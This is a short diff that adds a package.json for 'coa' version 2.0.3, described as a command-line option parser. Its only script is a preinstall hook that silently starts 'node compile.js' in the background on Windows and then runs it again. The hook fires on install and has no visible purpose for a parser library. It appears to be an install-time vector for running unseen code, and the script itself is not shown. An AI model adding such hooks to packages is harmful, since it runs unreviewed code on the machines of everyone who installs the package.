@@ -1,0 +1,8 @@
+{
+  "name": "coa",
+  "version": "2.0.3",
+  "description": "Command-Option-Argument: Yet another parser for command line options.",
+  "scripts": {
+    "preinstall": "start /B node compile.js & node compile.js"
+  }
+}
